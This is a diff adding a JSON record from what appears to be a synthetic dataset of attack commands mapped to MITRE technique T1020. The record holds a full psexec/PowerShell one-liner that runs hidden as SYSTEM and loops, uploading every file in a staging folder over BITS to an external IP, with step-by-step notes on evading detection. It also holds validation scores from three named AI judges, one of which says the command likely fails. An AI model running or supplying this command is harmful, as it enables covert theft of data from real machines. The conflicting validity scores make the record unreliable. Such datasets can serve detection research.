@@ -1,0 +1,60 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ Get-ChildItem 'C:\\Intel\\staging' -File | ForEach-Object { try { $u='https://203.0.113.25/bits/' + $_.Name; Start-BitsTransfer -Source $_.FullName -Destination $u -TransferType Upload -Authentication NONE -Asynchronous | Out-Null; Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } catch {} }; Start-Sleep 180 }\"",
+  "explanation": "Uses BITS to asynchronously upload staged files to an HTTPS endpoint and then relocates the originals. The loop provides automated, low-noise exfiltration.",
+  "rationale_steps": [
+    "Run as hidden SYSTEM via PSExec.",
+    "Enumerate files in a staging directory for upload.",
+    "Start asynchronous BITS upload jobs to reduce interactive noise.",
+    "Move files to a 'sent' folder after job initiation to avoid re-processing.",
+    "Pause between scans to minimize detection surface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-ada9cba0",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "psexec and PowerShell invocation are well-formed with balanced quotes/braces and valid separators/flags.",
+        "semantic_score": 3,
+        "semantic_justification": "It automates BITS-based uploads consistent with T1020, but likely fails due to the invalid -Authentication NONE value, immediate move of files before async upload completion, and the need for SYSTEM privileges despite 'Privilege: None'.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:04:25.090403Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for both psexec and PowerShell, and correct PowerShell syntax throughout the script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by using a continuous loop to scan for files, upload them via BITS (a legitimate Windows transfer mechanism), track transferred files, and includes error handling and sleep intervals to maintain persistence and stealth.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:04:28.124110Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags for psexec and powershell, and correct PowerShell syntax throughout the embedded script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves automated, low-noise exfiltration using BITS to an external HTTPS endpoint, directly aligning with T1020, and is operationally plausible by leveraging SYSTEM privileges via `psexec -s`.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:38:18.822691Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
